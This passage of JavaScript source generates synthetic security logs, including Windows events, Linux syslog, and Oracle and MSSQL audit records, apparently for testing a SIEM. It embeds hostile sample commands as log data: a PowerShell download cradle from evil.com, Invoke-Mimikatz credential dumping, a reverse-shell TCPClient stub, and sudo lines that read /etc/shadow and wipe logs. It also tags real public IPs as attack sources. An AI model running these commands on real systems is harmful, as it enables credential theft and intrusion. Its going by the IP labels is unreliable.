    const spn=pick(['MSSQLSvc/sql-prod-01.corp.local:1433','HTTP/webapp.corp.local:80','HOST/dc01.corp.local','CIFS/fileserver.corp.local']);
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4769,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,ServiceName:spn,TicketEncryptionType:'0x17',TicketOptions:'0x40810000',IpAddress:randomIP(),Status:'0x0'}},event:{code:'4769',action:'kerberos-service-ticket-requested',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else{
    // 4771 - Kerberos pre-authentication failed (password spray / brute force)
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4771,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,PreAuthType:'2',IpAddress:randomIP(),Status:pick(['0x12','0x18','0x25','0x6'])}},event:{code:'4771',action:'kerberos-preauth-failed',category:['authentication'],outcome:'failure',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }
}
function genWinApplication(ts){
  const eid=pick([1000,1001,1002,11707,11708]);
  const app=pick(['MicrosoftEdge.exe','OUTLOOK.EXE','chrome.exe','Teams.exe','explorer.exe','svchost.exe']);
  const hn=randomHostname();
  const provs={1000:'Application Error',1001:'Windows Error Reporting',1002:'Application Error',11707:'MsiInstaller',11708:'MsiInstaller'};
  const actions={1000:'application-error',1001:'application-crash-report',1002:'application-hang',11707:'application-installed',11708:'application-install-failed'};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Application",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Application Error',record_id:rand(10000,9999999),event_data:{ApplicationName:app,ApplicationVersion:`${rand(1,20)}.${rand(0,9)}.${rand(0,9999)}.0`,FaultingModuleName:pick(['ntdll.dll','kernelbase.dll','vcruntime140.dll',app]),ExceptionCode:`0x${randomHex(8)}`}},event:{code:String(eid),action:actions[eid]||'application-event',category:['process'],outcome:eid===11708?'failure':'unknown',kind:'event'},host:{name:hn,hostname:hn}});
}
function genWinSystem(ts){
  const eid=pick([7036,7045,6005,6006,41,1074]);
  const svc=pick(['wuauserv','BITS','Spooler','WinDefend','EventLog','Dnscache','LanmanWorkstation']);
  const hn=randomHostname();
  const state=pick(['running','stopped']);
  const provs={7036:'Service Control Manager',7045:'Service Control Manager',6005:'EventLog',6006:'EventLog',41:'Microsoft-Windows-Kernel-Power',1074:'USER32'};
  const actions={7036:`${svc}-state-change`,7045:'new-service-installed',6005:'event-log-started',6006:'event-log-stopped',41:'unexpected-shutdown',1074:'system-shutdown'};
  const evtData=(eid===7036||eid===7045)?{ServiceName:svc,ServiceType:pick(['demand start','auto start']),NewState:state}:{};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"System",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Service Control Manager',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action:actions[eid]||'system-event',category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn}});
}
function genWinAppLocker(ts){
  const eid=pick([8003,8004,8006,8007]);
  const isBlocked=eid===8004||eid===8007,isScript=eid===8006||eid===8007;
  const app=isBlocked?pick(['mimikatz.exe','psexec.exe','nc.exe','mshta.exe','wscript.exe']):pick(['chrome.exe','outlook.exe','winword.exe','excel.exe']);
  const hn=randomHostname(),user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:isScript?"Microsoft-Windows-AppLocker/Script and Packaged app-Execution":"Microsoft-Windows-AppLocker/EXE and DLL",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-AppLocker",record_id:rand(10000,9999999),event_data:{PolicyName:isScript?'Script':'EXE and DLL',RuleName:isBlocked?'Block untrusted executables':'Allow signed executables',TargetUser:`${domain}\\${user}`,FilePath:`C:\\${pick(['Windows\\System32','Users\\'+user+'\\Downloads','Temp','ProgramData'])}\\${app}`,FileHash:randomHex(64)}},event:{code:String(eid),action:isBlocked?'app-locker-blocked':'app-locker-allowed',category:['process'],outcome:isBlocked?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
function genWinPS(ts){
  const susp=Math.random()<0.3;
  const script=susp?pick(['IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")','Invoke-Mimikatz -DumpCreds','$c = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)']):pick(['Get-Service | Where-Object {$_.Status -eq "Running"}','Get-EventLog -LogName Security -Newest 100','Get-Process | Sort-Object CPU -Descending']);
  const hn=randomHostname(),user=randomUser();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4104,channel:"Microsoft-Windows-PowerShell/Operational",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-PowerShell",record_id:rand(10000,9999999),event_data:{ScriptBlockText:script,Path:susp?'':pick(['C:\\Scripts\\maintenance.ps1','C:\\Scripts\\backup.ps1','C:\\Scripts\\update.ps1'])}},event:{code:"4104",action:"script-block-logging",category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn},user:{name:user}});
}
function generateWindowsEventLogs(count,tr,types=WIN_TYPES_DEFAULT){
  const gens=[];
  if(types.includes('security'))gens.push(genWinSecurity,genWinSecurity,genWinAccountMgmt,genWinSecurityExtra);
  if(types.includes('application'))gens.push(genWinApplication);
  if(types.includes('system'))gens.push(genWinSystem);
  if(types.includes('applocker'))gens.push(genWinAppLocker);
  if(types.includes('powershell'))gens.push(genWinPS);
  if(gens.length===0)gens.push(genWinSecurity);
  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
}

// ─── Linux Generator ──────────────────────────────────────────────────────────
const LINUX_HOSTS=['web-prod-01','db-master-01','app-server-03','bastion-01','k8s-node-02','monitoring-01'];

// Real public IPs from known scanning/attack regions — used for failed SSH logins
// Format: [country_iso_code, country_name, city_name, continent_name, lat, lon]
const SSH_ATTACK_GEO={
  // China
  '1.180.204.1':    ['CN','China','Beijing','Asia',39.9042,116.4074],
  '27.19.55.42':    ['CN','China','Wuhan','Asia',30.5928,114.3055],
  '60.191.165.20':  ['CN','China','Hangzhou','Asia',30.2741,120.1551],
  '61.177.172.90':  ['CN','China','Suzhou','Asia',31.2989,120.5853],
  '103.25.8.112':   ['CN','China','Shanghai','Asia',31.2304,121.4737],
  '119.249.54.93':  ['CN','China','Guangzhou','Asia',23.1291,113.2644],
  '175.6.28.201':   ['CN','China','Chengdu','Asia',30.5723,104.0665],
  '222.186.15.226': ['CN','China','Nanjing','Asia',32.0603,118.7969],
  '123.58.180.54':  ['CN','China','Shenzhen','Asia',22.5431,114.0579],
  '36.255.220.5':   ['CN','China','Tianjin','Asia',39.3434,117.3616],
  // Russia
  '5.63.13.12':     ['RU','Russia','Moscow','Europe',55.7558,37.6173],
  '31.131.21.106':  ['RU','Russia','Saint Petersburg','Europe',59.9311,30.3609],
  '82.202.204.60':  ['RU','Russia','Novosibirsk','Asia',54.9833,82.8964],
  '185.220.101.1':  ['RU','Russia','Yekaterinburg','Asia',56.8389,60.6057],
  '194.165.16.72':  ['RU','Russia','Kazan','Europe',55.7879,49.1233],
  '91.108.4.200':   ['RU','Russia','Samara','Europe',53.2001,50.1500],
  '185.234.218.45': ['RU','Russia','Rostov-on-Don','Europe',47.2357,39.7015],
  '194.28.172.120': ['RU','Russia','Krasnodar','Europe',45.0355,38.9753],
  '37.228.129.3':   ['RU','Russia','Chelyabinsk','Asia',55.1644,61.4368],
  '195.54.160.149': ['RU','Russia','Omsk','Asia',54.9885,73.3242],
  // Iran
  '5.160.255.241':  ['IR','Iran','Tehran','Asia',35.6892,51.3890],
  '37.156.29.19':   ['IR','Iran','Mashhad','Asia',36.2605,59.6168],
  '79.175.131.86':  ['IR','Iran','Isfahan','Asia',32.6546,51.6680],
  '185.105.184.168':['IR','Iran','Tabriz','Asia',38.0962,46.2738],
  '194.5.193.50':   ['IR','Iran','Shiraz','Asia',29.5918,52.5837],
  '78.157.32.181':  ['IR','Iran','Ahvaz','Asia',31.3183,48.6706],
  '185.220.101.42': ['IR','Iran','Qom','Asia',34.6399,50.8760],
  '31.56.119.64':   ['IR','Iran','Kermanshah','Asia',34.3277,47.0778],
  '89.144.25.243':  ['IR','Iran','Rasht','Asia',37.2808,49.5832],
  '2.186.33.155':   ['IR','Iran','Zahedan','Asia',29.4963,60.8629],
  // Brazil
  '177.54.144.130': ['BR','Brazil','São Paulo','South America',-23.5505,-46.6333],
  '186.202.87.56':  ['BR','Brazil','Rio de Janeiro','South America',-22.9068,-43.1729],
  '201.93.192.13':  ['BR','Brazil','Belo Horizonte','South America',-19.9167,-43.9345],
  '179.184.115.17': ['BR','Brazil','Fortaleza','South America',-3.7172,-38.5434],
  '187.23.65.52':   ['BR','Brazil','Curitiba','South America',-25.4296,-49.2719],
  // Vietnam
  '103.76.228.155': ['VN','Vietnam','Ho Chi Minh City','Asia',10.8231,106.6297],
  '103.241.248.64': ['VN','Vietnam','Hanoi','Asia',21.0278,105.8342],
  '14.224.163.79':  ['VN','Vietnam','Da Nang','Asia',16.0544,108.2022],
  '113.161.88.43':  ['VN','Vietnam','Hai Phong','Asia',20.8449,106.6881],
  '116.110.9.213':  ['VN','Vietnam','Can Tho','Asia',10.0341,105.7852],
  // Romania
  '89.38.99.2':     ['RO','Romania','Bucharest','Europe',44.4268,26.1025],
  '185.239.48.60':  ['RO','Romania','Cluj-Napoca','Europe',46.7712,23.6236],
  '5.2.75.198':     ['RO','Romania','Timișoara','Europe',45.7489,21.2087],
  '79.113.131.218': ['RO','Romania','Iași','Europe',47.1585,27.6014],
  '185.81.157.45':  ['RO','Romania','Constanța','Europe',44.1733,28.6383],
  // India
  '103.15.28.200':  ['IN','India','Mumbai','Asia',19.0760,72.8777],
  '49.248.170.36':  ['IN','India','New Delhi','Asia',28.7041,77.1025],
  '117.201.14.225': ['IN','India','Bengaluru','Asia',12.9716,77.5946],
  '103.249.29.14':  ['IN','India','Hyderabad','Asia',17.3850,78.4867],
  '202.137.155.68': ['IN','India','Chennai','Asia',13.0827,80.2707],
  // Ukraine
  '193.142.146.3':  ['UA','Ukraine','Kyiv','Europe',50.4501,30.5234],
  '176.119.4.180':  ['UA','Ukraine','Kharkiv','Europe',49.9935,36.2304],
  '91.214.124.203': ['UA','Ukraine','Odessa','Europe',46.4825,30.7233],
  '94.158.244.108': ['UA','Ukraine','Dnipro','Europe',48.4647,35.0462],
  '95.67.40.220':   ['UA','Ukraine','Zaporizhzhia','Europe',47.8388,35.1396],
  // Indonesia
  '114.79.130.66':  ['ID','Indonesia','Jakarta','Asia',-6.2088,106.8456],
  '180.248.66.78':  ['ID','Indonesia','Surabaya','Asia',-7.2575,112.7521],
  '36.91.88.161':   ['ID','Indonesia','Bandung','Asia',-6.9175,107.6191],
  '180.251.35.66':  ['ID','Indonesia','Medan','Asia',3.5952,98.6722],
  '101.255.119.52': ['ID','Indonesia','Semarang','Asia',-6.9932,110.4203],
  // Turkey
  '95.172.66.108':  ['TR','Turkey','Istanbul','Europe',41.0082,28.9784],
  '77.92.68.165':   ['TR','Turkey','Ankara','Asia',39.9334,32.8597],
  '88.247.163.129': ['TR','Turkey','Izmir','Europe',38.4237,27.1428],
  '46.196.28.60':   ['TR','Turkey','Bursa','Europe',40.1885,29.0610],
  '78.188.93.34':   ['TR','Turkey','Adana','Asia',37.0000,35.3213],
  // Netherlands (Tor exit nodes / VPS abuse)
  '185.220.101.15': ['NL','Netherlands','Amsterdam','Europe',52.3676,4.9041],
  '185.220.101.26': ['NL','Netherlands','Rotterdam','Europe',51.9225,4.4792],
  '185.220.102.8':  ['NL','Netherlands','The Hague','Europe',52.0705,4.3007],
  '185.107.56.58':  ['NL','Netherlands','Utrecht','Europe',52.0907,5.1214],
  '194.165.17.42':  ['NL','Netherlands','Eindhoven','Europe',51.4416,5.4697],
};
const SSH_ATTACK_IPS=Object.keys(SSH_ATTACK_GEO);
// Build source.geo object from lookup, adding slight jitter so pins spread on the map
const sshGeoFor=ip=>{const g=SSH_ATTACK_GEO[ip];if(!g)return null;const[c,cn,ci,cont,lat,lon]=g;return{country_iso_code:c,country_name:cn,city_name:ci,continent_name:cont,location:{lat:+(lat+(Math.random()-0.5)*0.4).toFixed(4),lon:+(lon+(Math.random()-0.5)*0.4).toFixed(4)}}};

const LINUX_TYPE_LOG_COUNT={
  ssh:      {low:120, med:400, high:1200},
  sudo:     {low:50,  med:160, high:500},
  usermgmt: {low:30,  med:120, high:400},
  auditd:   {low:50,  med:160, high:500},
  cron:     {low:30,  med:80,  high:200},
};
const LINUX_TYPES_DEFAULT=['ssh','sudo','usermgmt','auditd','cron'];
const LINUX_TYPE_LABELS={ssh:'SSH',sudo:'Sudo',usermgmt:'User Mgmt',auditd:'Auditd',cron:'Cron'};

// ─── Oracle DB Constants ──────────────────────────────────────────────────────
const ORACLE_HOSTS=['ora-prod-01','ora-prod-02','ora-prod-03','ora-dr-01','ora-dr-02','ora-rpt-01','ora-standby-01'];
const ORACLE_USERS=['SCOTT','HR','OE','SH','SYSTEM','SYS','APPS','REPORTS_USER','BATCH_USER','APEX_PUBLIC_USER','DBSNMP','C##APP_OWNER'];
const ORACLE_SCHEMAS_TABLES=['HR.EMPLOYEES','HR.DEPARTMENTS','HR.JOBS','OE.ORDERS','OE.ORDER_ITEMS','OE.CUSTOMERS','SH.SALES','SH.PRODUCTS','SH.CHANNELS','SYSTEM.V$SESSION','SYSTEM.DBA_USERS','APPS.AP_INVOICES_ALL','APPS.PO_HEADERS_ALL'];
const ORACLE_ERROR_CODES=['ORA-00001','ORA-00060','ORA-01017','ORA-01555','ORA-04031','ORA-12170','ORA-28000','ORA-00942'];
const ORACLE_ERROR_MSGS={'ORA-00001':'unique constraint violated','ORA-00060':'Deadlock detected. See Note 60.1 at My Oracle Support for help.','ORA-01017':'invalid username/password; logon denied','ORA-01555':'snapshot too old: rollback segment number with name "" too small','ORA-04031':'unable to allocate bytes of shared memory','ORA-12170':'TNS:Connect timeout occurred','ORA-28000':'the account is locked','ORA-00942':'table or view does not exist'};
const ORACLE_SERVICE_NAMES=['ORCL','ORCLPDB1','SALES_PDB','HR_PDB','REPORTS_PDB'];
const ORACLE_DBIDS=['1234567890','2345678901','3456789012','4567890123'];
const ORACLE_TYPE_LOG_COUNT={audit:{low:50,med:160,high:500},alert:{low:40,med:120,high:400},listener:{low:40,med:120,high:400},metrics:{low:20,med:60,high:200},security:{low:30,med:100,high:300}};
const ORACLE_TYPES_DEFAULT=['audit','alert','listener','metrics','security'];
const ORACLE_TYPE_LABELS={audit:'Audit',alert:'Alert Log',listener:'Listener',metrics:'Metrics',security:'Security Events'};
const oracleIsoTs=d=>d.toISOString().replace(/(\.\d{3})Z$/,(_,ms)=>ms+'000+00:00');
const oracleListenerTs=d=>{const m=['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'];return`${String(d.getUTCDate()).padStart(2,'0')}-${m[d.getUTCMonth()]}-${d.getUTCFullYear()} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;};

// ─── MSSQL Constants ──────────────────────────────────────────────────────────
const MSSQL_HOSTS=['sql-prod-01','sql-prod-02','sql-prod-03','sql-reporting-01','sql-reporting-02','sql-dr-01','sql-ha-01','sql-dev-01'];
const MSSQL_USERS=['sa','AppUser','ReportUser','BackupUser','CORP\\jsmith','CORP\\dbadmin','CORP\\svc_sql','CORP\\mwilson','NT SERVICE\\MSSQLSERVER','ETL_User','ReadOnlyUser'];
const MSSQL_DATABASES=['AdventureWorks2019','HR_DB','SalesDB','ReportingDB','master','msdb','FinanceDB','InventoryDB'];
const MSSQL_TABLES=['dbo.Employees','dbo.Orders','dbo.Customers','dbo.SalesHistory','dbo.Products','dbo.Inventory','HumanResources.Employee','Sales.SalesOrderHeader','Production.Product','Person.Person'];
const MSSQL_ERROR_CODES={18456:'Login failed for user',208:'Invalid object name',547:'Constraint violation',1205:'Transaction was deadlocked',8152:'String or binary data would be truncated'};
const MSSQL_AUDIT_ACTIONS=['SL','IN','UP','DL','EX','AU','LO'];
const MSSQL_AUDIT_ACTION_LABELS={SL:'SELECT',IN:'INSERT',UP:'UPDATE',DL:'DELETE',EX:'EXECUTE',AU:'AUDIT_CHANGE',LO:'LOGOUT'};
const MSSQL_TYPE_LOG_COUNT={audit:{low:50,med:160,high:500},errorlog:{low:50,med:160,high:500},translog:{low:60,med:200,high:600},agent:{low:30,med:80,high:300},metrics:{low:20,med:60,high:200},security:{low:30,med:100,high:300}};
const MSSQL_TYPES_DEFAULT=['audit','errorlog','translog','agent','metrics','security'];
const MSSQL_TYPE_LABELS={audit:'Audit',errorlog:'Error Log',translog:'Transaction Log',agent:'SQL Agent',metrics:'Metrics',security:'Security Events'};
// ─── AWS CloudTrail constants ─────────────────────────────────────────────────
const CT_ACCOUNTS=['123456789012','234567890123','345678901234'];
const CT_REGIONS=['us-east-1','us-west-2','eu-west-1','ap-southeast-1','us-east-2','eu-central-1','ap-northeast-1'];
const CT_TYPE_LOG_COUNT={management:{low:80,med:200,high:600},iam:{low:40,med:120,high:400},s3_data:{low:60,med:200,high:800},security:{low:20,med:60,high:200}};
const CT_TYPES_DEFAULT=['management','iam','s3_data','security'];
const CT_TYPE_LABELS={management:'Management',iam:'IAM',s3_data:'S3 Data',security:'Security'};
// ─── Okta constants ───────────────────────────────────────────────────────────
const OKTA_APPS=['Office365','Salesforce','Slack','Zoom','GitHub Enterprise','AWS SSO','Jira','ServiceNow'];
const OKTA_TYPE_LOG_COUNT={auth:{low:60,med:200,high:600},lifecycle:{low:30,med:100,high:300},policy:{low:20,med:60,high:200},app:{low:20,med:60,high:200}};
const OKTA_TYPES_DEFAULT=['auth','lifecycle','policy','app'];
const OKTA_TYPE_LABELS={auth:'Authentication',lifecycle:'User Lifecycle',policy:'Policy',app:'Application'};
// ─── CrowdStrike constants ────────────────────────────────────────────────────
const CS_HOSTS=['DESKTOP-CS001','LAPTOP-EXEC017','WS-DEV-042','SRV-APP-003','LAPTOP-SALES-019','DC-CORP-01','WORKSTATION-099'];
const CS_HOST_INFO={
  'DESKTOP-CS001':   {aid:'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', sensorVersion:'7.14.16703.0', os:{name:'Windows 10',family:'windows',version:'10.0.19044',platform:'windows'}, ip:'10.0.1.11'},
  'LAPTOP-EXEC017':  {aid:'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5', sensorVersion:'7.15.17302.0', os:{name:'Windows 11',family:'windows',version:'10.0.22621',platform:'windows'}, ip:'10.0.1.17'},
  'WS-DEV-042':      {aid:'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6', sensorVersion:'7.14.16703.0', os:{name:'Windows 10',family:'windows',version:'10.0.19045',platform:'windows'}, ip:'10.0.2.42'},
  'SRV-APP-003':     {aid:'d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1', sensorVersion:'7.15.17302.0', os:{name:'Windows Server 2022',family:'windows',version:'10.0.20348',platform:'windows'}, ip:'10.0.3.3'},
  'LAPTOP-SALES-019':{aid:'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', sensorVersion:'7.13.15801.0', os:{name:'Windows 11',family:'windows',version:'10.0.22631',platform:'windows'}, ip:'10.0.1.19'},
  'DC-CORP-01':      {aid:'f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3', sensorVersion:'7.15.17302.0', os:{name:'Windows Server 2019',family:'windows',version:'10.0.17763',platform:'windows'}, ip:'10.0.0.1'},
  'WORKSTATION-099': {aid:'a7b8c9d0e1f2a7b8c9d0e1f2a7b8c9d0', sensorVersion:'7.13.15801.0', os:{name:'Windows 10',family:'windows',version:'10.0.19041',platform:'windows'}, ip:'10.0.2.99'},
};
const CS_TACTICS=['Execution','Persistence','Privilege Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement','Exfiltration','Command and Control'];
const CS_TECHNIQUES=['PowerShell','Scheduled Task/Job','DLL Side-Loading','Credential Dumping','Network Share Discovery','Pass the Hash','Process Injection'];
const CS_DETECT_NAMES=['Suspicious PowerShell Execution','Credential Dumping Tool Detected','Lateral Movement via PsExec','Ransomware Behavior Detected','Privilege Escalation via Token Impersonation','Process Injection Detected','Cobalt Strike Beacon Activity'];
const CS_TYPE_LOG_COUNT={process:{low:60,med:200,high:600},network:{low:40,med:120,high:400},detections:{low:30,med:100,high:300},dns:{low:40,med:120,high:400},vulnerability:{low:20,med:60,high:200},alerts:{low:20,med:60,high:200},host:{low:7,med:7,high:7}};
const CS_TYPES_DEFAULT=['process','network','detections','dns','vulnerability','alerts','host'];
const CS_TYPE_LABELS={process:'Process',network:'Network',detections:'Detections',dns:'DNS',vulnerability:'Vulnerability',alerts:'Alerts',host:'Host Inventory'};
// ─── Windows DNS & AD constants ───────────────────────────────────────────────
const AD_DC_HOSTS=['DC01','DC02','ADDC-NYC-01','ADDC-LON-01','PDC-CORP-01'];
const AD_DOMAINS=['corp.local','contoso.local','fabrikam.local','acme.local'];
const adDomain=()=>pick(AD_DOMAINS);
const WDNS_TYPE_LOG_COUNT={dns:{low:80,med:300,high:1000},kerberos:{low:60,med:200,high:600},ldap:{low:40,med:120,high:400},changes:{low:20,med:60,high:200}};
const WDNS_TYPES_DEFAULT=['dns','kerberos','ldap','changes'];
const WDNS_TYPE_LABELS={dns:'DNS Queries',kerberos:'Kerberos',ldap:'LDAP',changes:'AD Changes'};
const mssqlTs=d=>{const dt=d.toISOString().split('T')[0];const hh=String(d.getUTCHours()).padStart(2,'0');const mm=String(d.getUTCMinutes()).padStart(2,'0');const ss=String(d.getUTCSeconds()).padStart(2,'0');const cs=String(Math.floor(d.getUTCMilliseconds()/10)).padStart(2,'0');return`${dt} ${hh}:${mm}:${ss}.${cs}`;};

function genSSH(ts){
  const host=randomLinuxHostname(),user=randomUser(),port=rand(1024,65535),pid=rand(1000,65535);
  // Successful logins use internal/RFC1918 IPs; failures use real external IPs for GeoIP map
  const internalIP=randomIP();
  const externalIP=pick(SSH_ATTACK_IPS);
  const r=Math.random();
  // ~40% accepted (internal), ~35% failed password (external), ~12% failed invalid user (external), ~13% misc
  if(r<0.40) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: Accepted ${pick(['password','password','publickey'])} for ${user} from ${internalIP} port ${port} ssh2`;
  if(r<0.55) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for ${user} from ${externalIP} port ${port} ssh2`;
  if(r<0.67) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for invalid user ${pick(['root','admin','test','oracle','pi','ubuntu','guest','deploy','ansible'])} from ${externalIP} port ${port} ssh2`;
  if(r<0.75) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: session opened for user ${user} by (uid=${rand(0,1000)})`;
  if(r<0.81) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: session closed for user ${user}`;
  if(r<0.87) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: Disconnected from authenticating user ${pick(['root','admin','test'])} ${externalIP} port ${port} [preauth]`;
  if(r<0.93) return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: error: maximum authentication attempts exceeded for ${pick(['root','admin'])} from ${externalIP} port ${port} ssh2 [preauth]`;
  return `${syslogTimestamp(ts)} ${host} sshd[${pid}]: Connection closed by ${externalIP} port ${port}`;
}

function genSudo(ts){
  const host=randomLinuxHostname(),user=randomUser(),pid=rand(1000,65535);
  const cmd=pick([
    '/bin/systemctl restart nginx','/bin/systemctl stop firewalld',
    '/usr/bin/apt-get update','/usr/bin/apt-get install -y curl',
    '/bin/cat /etc/shadow','/bin/cat /etc/passwd',
    '/usr/bin/docker ps -a','/usr/bin/docker exec -it webapp bash',
    '/bin/rm -rf /var/log/auth.log','/bin/chmod 777 /etc/crontab',
    '/usr/sbin/useradd deploy_svc','/usr/sbin/usermod -aG sudo jsmith',
    '/usr/bin/passwd root','/bin/bash','/usr/bin/vi /etc/sudoers',
    '/usr/bin/tcpdump -i eth0','/usr/sbin/iptables -F',
    '/bin/mount /dev/sdb1 /mnt/data','/usr/bin/crontab -e',
  ]);
  const fail=Math.random()<0.12;
  if(fail) return `${syslogTimestamp(ts)} ${host} sudo: ${user} : command not allowed ; TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;
  const notSudoer=Math.random()<0.06;
  if(notSudoer) return `${syslogTimestamp(ts)} ${host} sudo: ${user} : user NOT in sudoers ; TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;
  return `${syslogTimestamp(ts)} ${host} sudo[${pid}]: ${user} : TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;
}

function genUserMgmt(ts){
  const host=randomLinuxHostname(),pid=rand(1000,65535);
  const actor=pick(['root',..._ADMIN_USERS]);
  const target=pick([..._USERS_LIST,`svc_${pick(['deploy','monitor','backup','api','web'])}`]);
  const gid=rand(1001,9999),uid=rand(1001,9999);
  const adminGroups=['sudo','wheel','adm','docker','sudoers'];
  const group=pick([...adminGroups,'developers','ops','finance','security','devops']);
  const r=Math.random();
  if(r<0.18) return `${syslogTimestamp(ts)} ${host} useradd[${pid}]: new user: name=${target}, UID=${uid}, GID=${uid}, home=/home/${target}, shell=/bin/bash`;
  if(r<0.24) return `${syslogTimestamp(ts)} ${host} userdel[${pid}]: delete user '${target}'`;
  if(r<0.32) return `${syslogTimestamp(ts)} ${host} usermod[${pid}]: change user '${target}' information`;
  if(r<0.44) return `${syslogTimestamp(ts)} ${host} gpasswd[${pid}]: user ${target} added by ${actor} to group ${group}`;
  if(r<0.54) return `${syslogTimestamp(ts)} ${host} gpasswd[${pid}]: user ${target} removed by ${actor} from group ${group}`;
  if(r<0.64) return `${syslogTimestamp(ts)} ${host} groupadd[${pid}]: new group: name=${group}, GID=${gid}`;
  if(r<0.70) return `${syslogTimestamp(ts)} ${host} groupdel[${pid}]: removed group '${group}'`;
  if(r<0.80) return `${syslogTimestamp(ts)} ${host} passwd[${pid}]: password changed for ${target}`;
  if(r<0.88) return `${syslogTimestamp(ts)} ${host} chage[${pid}]: changed password expiry for ${target}`;
  return `${syslogTimestamp(ts)} ${host} usermod[${pid}]: add '${target}' to shadow group '${group}'`;
}

function genAuditd(ts){const host=randomLinuxHostname(),epoch=(ts.getTime()/1000).toFixed(3),uid=rand(1000,65535),exe=pick(['/usr/bin/curl','/usr/bin/wget','/bin/bash','/usr/bin/python3','/usr/bin/nc']);return `${syslogTimestamp(ts)} ${host} audit[${rand(1,9999)}]: type=SYSCALL msg=audit(${epoch}:${rand(100,9999)}): arch=c000003e syscall=${rand(0,350)} success=${pick(['yes','no'])} pid=${rand(1,65535)} uid=${uid} exe="${exe}" key="${pick(['file_access','process_exec','network_connect','priv_escalation'])}"`;}
function genCron(ts){return `${syslogTimestamp(ts)} ${randomLinuxHostname()} CRON[${rand(1000,65535)}]: (${pick(['root',randomUser()])}) CMD (${pick(['/usr/local/bin/backup.sh','/opt/scripts/cleanup.py','/usr/bin/logrotate /etc/logrotate.conf'])})`;}
function generateLinuxLogs(count,tr,types=LINUX_TYPES_DEFAULT){
  const active=types.length?types:LINUX_TYPES_DEFAULT;
  const W={ssh:38,sudo:22,usermgmt:18,auditd:12,cron:10};
  const filtered=Object.entries(W).filter(([t])=>active.includes(t));
  const total=filtered.reduce((s,[,w])=>s+w,0);
  return generateTimestamps(count,tr).map(ts=>{
    let r=Math.random()*total,cum=0;
    for(const [t,w] of filtered){cum+=w;if(r<cum)return t==='ssh'?genSSH(ts):t==='sudo'?genSudo(ts):t==='usermgmt'?genUserMgmt(ts):t==='auditd'?genAuditd(ts):genCron(ts);}
    return genCron(ts);
  });
}

// ─── Oracle DB Generators ────────────────────────────────────────────────────
function genOracleAudit(ts){
  const user=pick(ORACLE_USERS),clientIp=randomIP(),host=pick(ORACLE_HOSTS),table=pick(ORACLE_SCHEMAS_TABLES);
  const action=pick(['SELECT','INSERT','UPDATE','DELETE','EXECUTE','LOGON','LOGOFF']);
  const dbid=pick(ORACLE_DBIDS),status=Math.random()<0.08?pick(['1','16','28']):'0';
  const port=rand(1024,65535);
  const sql=action==='SELECT'?`SELECT * FROM ${table} WHERE ROWNUM <= 100`:action==='INSERT'?`INSERT INTO ${table} VALUES (:1,:2,:3)`:action==='UPDATE'?`UPDATE ${table} SET STATUS='ACTIVE' WHERE ID=:1`:action==='DELETE'?`DELETE FROM ${table} WHERE ID=:1`:`EXEC ${table.split('.')[1]||'PKG'}.PROCEDURE`;
  const addr=`(ADDRESS=(PROTOCOL=tcp)(HOST=${clientIp})(PORT=${port}))`;
  return`${oracleIsoTs(ts)} LENGTH: "200" ACTION :[${action.length}] "${action}" DATABASE USER:[${user.length}] "${user}" PRIVILEGE :[4] "NONE" CLIENT USER:[6] "oracle" STATUS:[${status.length}] "${status}" CLIENT ADDRESS:[${addr.length}] "${addr}" USERHOST:[${host.length}] "${host}.corp" DBID:[10] "${dbid}" SQLTEXT:[${sql.length}] "${sql}"`;
}
function genOracleAlert(ts){
  const isError=Math.random()<0.25;
  const line1=oracleIsoTs(ts);
